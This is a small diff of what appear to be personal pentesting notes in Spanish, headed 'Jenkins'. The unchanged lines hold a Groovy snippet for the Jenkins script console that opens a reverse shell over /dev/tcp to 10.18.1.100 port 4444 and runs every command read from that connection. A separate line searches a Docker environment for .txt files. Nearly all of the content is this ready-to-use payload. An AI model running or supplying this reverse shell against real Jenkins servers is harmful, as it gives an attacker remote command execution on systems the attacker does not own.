@@ -1,4 +1,4 @@
-
+############################################################### Jenkins
 conseguir shell inversa desde el script console
 r = Runtime.getRuntime()
 p = r.exec (["/bin/bash","-c","exec 5<>/dev/tcp/10.18.1.100/4444;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
@@ -10,4 +10,5 @@ lograr una bash:
 
 buscar un archivo en el entorno de docker:
 find / -name *.txt
+
 
